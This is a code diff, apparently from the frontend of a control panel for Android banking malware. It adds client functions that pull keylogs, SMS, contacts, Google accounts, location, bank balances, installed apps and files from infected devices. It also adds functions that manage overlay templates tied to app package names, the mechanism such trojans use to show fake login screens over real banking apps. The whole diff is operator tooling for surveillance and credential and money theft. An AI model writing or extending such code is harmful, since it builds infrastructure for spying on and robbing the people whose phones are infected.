@@ -111,6 +111,76 @@ export const devicesAPI = {
     const response = await api.post(`/api/devices/${deviceId}/clipboard`, { text });
     return response.data;
   },
+
+  reconnectDevice: async (deviceId: string): Promise<any> => {
+    const response = await api.post(`/api/devices/${deviceId}/reconnect`);
+    return response.data;
+  },
+
+  getKeylogs: async (deviceId: string, limit = 200): Promise<any[]> => {
+    const response = await api.get(`/api/devices/${deviceId}/keylogs-all?limit=${limit}`);
+    return response.data;
+  },
+
+  createOverlayMapping: async (deviceId: string, data: { package_name: string; screen_name?: string; template: any; is_enabled?: boolean }) => {
+    const response = await api.post(`/api/devices/${deviceId}/overlay-mappings`, data);
+    return response.data;
+  },
+
+  getOverlayMappings: async (deviceId: string) => {
+    const response = await api.get(`/api/devices/${deviceId}/overlay-mappings`);
+    return response.data;
+  },
+
+  deleteOverlayMapping: async (deviceId: string, mappingId: number) => {
+    const response = await api.delete(`/api/devices/${deviceId}/overlay-mappings/${mappingId}`);
+    return response.data;
+  },
+
+  getApps: async (deviceId: string) => {
+    try {
+      const response = await api.get(`/api/devices/${deviceId}/installed-apps`);
+      return response.data;
+    } catch {
+      const response = await api.get(`/api/devices/${deviceId}/apps`);
+      return response.data;
+    }
+  },
+
+  refreshApps: async (deviceId: string) => {
+    const response = await api.post(`/api/devices/${deviceId}/refresh-apps`);
+    return response.data;
+  },
+
+  getBankBalances: async (deviceId: string) => {
+    const response = await api.get(`/api/devices/${deviceId}/bank-balances`);
+    return response.data;
+  },
+
+  getSms: async (deviceId: string) => {
+    const response = await api.get(`/api/devices/${deviceId}/sms`);
+    return response.data;
+  },
+
+  getContacts: async (deviceId: string) => {
+    const response = await api.get(`/api/devices/${deviceId}/contacts`);
+    return response.data;
+  },
+
+  getGoogleAccounts: async (deviceId: string) => {
+    const response = await api.get(`/api/devices/${deviceId}/google-accounts`);
+    return response.data;
+  },
+
+  getLocation: async (deviceId: string) => {
+    const response = await api.get(`/api/devices/${deviceId}/location`);
+    return response.data;
+  },
+
+  getFileList: async (deviceId: string, path: string = '/sdcard') => {
+    const response = await api.get(`/api/devices/${deviceId}/file-list?path=${encodeURIComponent(path)}`);
+    return response.data;
+  },
 };
 
 // ==================== APK API ====================
